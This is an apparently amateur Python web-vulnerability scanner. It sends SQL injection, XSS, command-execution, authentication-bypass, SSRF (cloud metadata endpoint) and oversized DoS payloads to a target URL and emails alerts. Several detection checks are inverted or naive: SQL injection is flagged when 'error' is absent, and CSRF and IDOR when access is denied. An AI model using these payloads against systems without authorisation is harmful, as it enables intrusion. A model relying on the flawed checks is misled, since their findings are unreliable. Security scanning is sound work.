import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from loguru import logger
import smtplib
from email.mime.text import MIMEText

logger.add("detailed_security_log.log", rotation="1 week", level="INFO")

driver = webdriver.Chrome()

def send_alert(subject, body):
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = "alert@example.com"
    msg["To"] = "admin@example.com"

    with smtplib.SMTP("smtp.example.com") as server:
        server.login("username", "password")
        server.sendmail(msg["From"], [msg["To"]], msg.as_string())

def log_and_alert(message):
    logger.warning(message)
    send_alert("Security Alert", message)

def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR 'a'='a",
        '" OR "a"="a',
        "1' OR '1'='1",
        "' UNION SELECT NULL, NULL, NULL --",
        "' AND 1=CONVERT(int, CHAR(58)) --",
    ]
    for payload in payloads:
        test_url = f"{url}?search={payload}"
        response = requests.get(test_url)
        if "error" not in response.text:
            log_and_alert(f"Potential SQL Injection vulnerability detected at {test_url}")

def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
    ]
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            log_and_alert(f"Potential XSS vulnerability detected at {test_url}")

def check_rce(url):
    payloads = [
        "system('id')",
        "exec('whoami')",
        "shell_exec('ls')",
        "passthru('ls')",
        "eval('echo phpinfo();')",
    ]
    for payload in payloads:
        test_url = f"{url}?command={payload}"
        response = requests.get(test_url)
        if "uid=" in response.text or "phpinfo()" in response.text:
            log_and_alert(f"Potential Remote Code Execution vulnerability detected at {test_url}")

def check_csrf(url):
    response = requests.post(url, data={"action": "delete"})
    if "unauthorized" in response.text or "403 Forbidden" in response.text:
        log_and_alert(f"Potential CSRF vulnerability detected at {url}")

def check_file_upload(url):
    files = {'file': ('test.png', open('test.png', 'rb'))}
    response = requests.post(url, files=files)
    if response.status_code == 200 and "success" in response.text:
        log_and_alert(f"File upload functionality detected at {url}")

def check_information_disclosure(url):
    response = requests.get(url)
    if "confidential" in response.text or "internal" in response.text:
        log_and_alert(f"Potential Information Disclosure vulnerability detected at {url}")

def check_authentication_bypass(url):
    payloads = [
        {"username": "admin", "password": "password"},
        {"username": "admin' --", "password": ""},
        {"username": "admin", "password": "password' OR '1'='1"},
    ]
    for payload in payloads:
        response = requests.post(url, data=payload)
        if "Welcome" in response.text or "Dashboard" in response.text:
            log_and_alert(f"Potential Authentication Bypass vulnerability detected at {url}")

def check_insecure_session_management(url):
    response = requests.get(url)
    cookies = response.cookies
    if "sessionid" in cookies:
        response = requests.get(url, cookies={"sessionid": "invalid"})
        if response.status_code == 200:
            log_and_alert(f"Potential Insecure Session Management vulnerability detected at {url}")

def check_idor(url):
    payloads = ["1", "2", "100", "999"]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "Unauthorized" in response.text or "Access Denied" in response.text:
            log_and_alert(f"Potential IDOR vulnerability detected at {test_url}")

def check_account_takeover(url):
    payloads = [
        {"email": "test@example.com", "password": "password"},
        {"email": "admin@example.com", "password": "password' OR '1'='1"},
    ]
    for payload in payloads:
        response = requests.post(url, data=payload)
        if "Welcome" in response.text or "Dashboard" in response.text:
            log_and_alert(f"Potential Account Takeover vulnerability detected at {url}")

def check_ssrf(url):
    payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"]
    for payload in payloads:
        test_url = f"{url}?target={payload}"
        response = requests.get(test_url)
        if "meta-data" in response.text:
            log_and_alert(f"Potential SSRF vulnerability detected at {test_url}")

def check_dos(url):
    payloads = ["A" * 10000, "B" * 10000]
    for payload in payloads:
        try:
            response = requests.post(url, data={"data": payload})
            if response.status_code != 200:
                log_and_alert(f"Potential DOS vulnerability detected at {url}")
        except requests.exceptions.RequestException as e:
            log_and_alert(f"Error during DOS test at {url}: {e}")

def monitor_website(url):
    check_sql_injection(url)
    check_xss(url)
    check_rce(url)
    check_csrf(url)
    check_file_upload(url)
    check_information_disclosure(url)
    check_authentication_bypass(url)
    check_insecure_session_management(url)
    check_idor(url)
    check_account_takeover(url)
    check_ssrf(url)
    check_dos(url)

if __name__ == '__main__':
    target_url = "http://example.com"
    monitor_website(target_url)
